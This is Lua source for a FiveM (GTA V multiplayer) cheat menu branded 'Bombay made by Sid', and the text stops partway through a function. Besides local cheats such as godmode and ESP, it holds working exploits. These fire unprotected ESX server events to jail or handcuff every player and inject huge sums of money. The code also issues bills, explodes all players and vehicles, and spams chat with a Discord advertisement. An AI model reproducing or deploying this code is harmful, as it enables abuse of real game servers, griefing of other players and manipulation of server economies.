                bZ.blip = AddBlipForCoord(bU + 0.5, bV + 0.5, bW + 0.5)
                SetBlipSprite(bZ.blip, bZ.id)
                SetBlipDisplay(bZ.blip, 4)
                SetBlipScale(bZ.blip, 0.9)
                SetBlipColour(bZ.blip, bZ.colour)
                SetBlipAsShortRange(bZ.blip, true)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(name)
                EndTextCommandSetBlipName(bZ.blip)
            end
        else
            drawNotification('~w~Invalid coords!', true)
        end
    end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function CaPl() local ax = GetPlayerPed(-1) local ay = GetVehiclePedIsIn(ax, true) local m = KeyboardInput("Enter license plate you want", "", 100) if m ~= ""
then SetVehicleNumberPlateText(ay, m) end end;

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), true), 2)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), true)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function engine(veh)
					 SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)				
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end

-- MAIN CODE --


ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
			-- show blips
			for id = 0, 128 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					-- Wanted level display
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
						SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

					-- Speaking display
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
					else
						SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
					end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 128 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while Enabled do
		
			if RichEnable then
			SetRichPresence(RichContent)
			SetDiscordAppId(appID)
			SetDiscordRichPresenceAsset(assetID)
			SetDiscordRichPresenceAssetSmall(assetID)
		else
			SetRichPresence(0)
			SetDiscordAppId(0)
			SetDiscordRichPresenceAsset(0)
			SetDiscordRichPresenceAssetSmall(0)
			end
		
		
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end

			if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(), 4.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 4.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
			
			if SpeedCar then
			if IsPedSittingInAnyVehicle(ped) then
			local veh = GetVehiclePedIsUsing(ped)
				if veh ~= nil then		
					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(ped, false), 12.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(ped, false), 6.0);
				end
			end
		end
	end


			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			
						if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuff', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if esp then
				for i = 0, 300 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~y~" ..
							GetPlayerName(i) ..
										"\n~b~ Distance: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
				
						DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					end
				end
			end

			if supergrip then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if blowall then
                for i = 0, 300 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if jailallusers then
				for i = 0, 450 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?", 997)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?", 32532532, securityToken)
				TriggerServerEvent("esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?", 500324532)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?")
				TriggerServerEvent('chatMessageEntered', "LordSidIsBack", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." ^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33?")
					end
				end

			if esxdestroy then
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for bD = 5, 5 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^1Admin',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '^1Bombay ^4made by Sid ^5Official Discord: https://discord.gg/u9CxU33? ~ https://discord.gg/u9CxU33'
                            )
                        end
                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                '^1Bombay ^4made by Sid ^5Official Discord: ^1https://discord.gg/u9CxU33? ~ https://discord.gg/u9CxU33',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
